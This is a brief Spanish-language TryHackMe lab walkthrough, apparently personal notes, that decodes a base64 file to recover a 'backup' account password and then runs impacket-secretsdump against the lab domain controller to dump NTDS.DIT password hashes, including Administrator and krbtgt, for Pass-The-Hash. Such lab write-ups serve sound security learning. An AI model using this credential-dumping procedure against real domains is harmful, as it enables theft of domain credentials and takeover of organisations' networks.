En este caso es muy cantoso ya que se llama backup literal el nombre de la cuenta, veamos el ejemplo:
```
┌──(root㉿Olvidix)-[/home/kali/Desktop/TryHackMe]
└─# cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw                                                                                                                                                                                                                                            
┌──(root㉿Olvidix)-[/home/kali/Desktop/TryHackMe]
└─# cat backup_credentials.txt | base64 -d  
backup@spookysec.local:backup2517860      
```

```
┌──(root㉿Olvidix)-[/home/kali/Desktop/TryHackMe]
└─# impacket-secretsdump spookysec.local/backup:backup2517860@10.10.81.85 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
```

Vemos que entre muchas cosas que saca saca hashes de admin que podemos usar para hacer Pass-The-Hash

Cogemos lo importante:
![[Pasted image 20250515221940.png]]